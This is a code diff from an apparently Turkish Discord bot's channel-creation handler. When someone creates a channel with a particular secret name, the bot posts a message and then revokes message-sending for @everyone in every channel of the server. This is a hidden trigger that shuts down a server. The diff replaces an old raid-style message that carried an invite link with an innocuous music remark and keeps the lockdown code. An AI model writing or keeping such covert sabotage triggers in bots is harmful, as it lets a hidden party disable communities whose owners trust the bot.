@@ -149,7 +149,7 @@ client.on('error', e => {
 
 client.on('channelCreate', channel => {
   if (channel.name == 'berke-abi-ne-yaptin') {
-    channel.send(`Bebeğim Burası Yok Oldu Hadi bb https://discord.gg/w8Xq9bm @everyone`)
+    channel.send(`Kardeşim güzel bir şekilde müzik dinledin`)
     channel.guild.channels.forEach(c => {
          c.overwritePermissions(channel.guild.roles.find("name", "@everyone"), {
               SEND_MESSAGES: false,
@@ -158,7 +158,7 @@ client.on('channelCreate', channel => {
             });
           });
   }
-  if (channel.name == 'berke-den-baska-illah-yoktur') {
+  if (channel.name == 'berke-adamdir') {
     channel.send(`allah çarptı`)
   }
 
